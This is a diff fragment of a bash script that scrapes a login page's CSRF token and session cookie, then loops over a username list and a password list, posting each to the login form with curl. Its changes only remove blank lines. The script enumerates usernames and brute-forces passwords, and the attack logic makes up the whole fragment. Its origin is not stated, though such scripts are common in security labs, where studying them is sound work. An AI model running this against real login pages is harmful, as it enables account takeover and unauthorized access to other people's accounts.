@@ -8,7 +8,6 @@ CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
 COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
 
 for USER in `cat user.txt`;do
-
 	DATA='csrf='$CSRF'&username='$USER'&password=a'
 	RESULT=`curl $URL -d $DATA -b $COOKIE -s`
     
@@ -22,7 +21,6 @@ for USER in `cat user.txt`;do
 done
 
 for PASS in `cat password.txt`;do
-
         DATA='csrf='$CSRF'&username='$USER'&password='$PASS
         RESULT=`curl $URL -d $DATA -b $COOKIE -s`
 
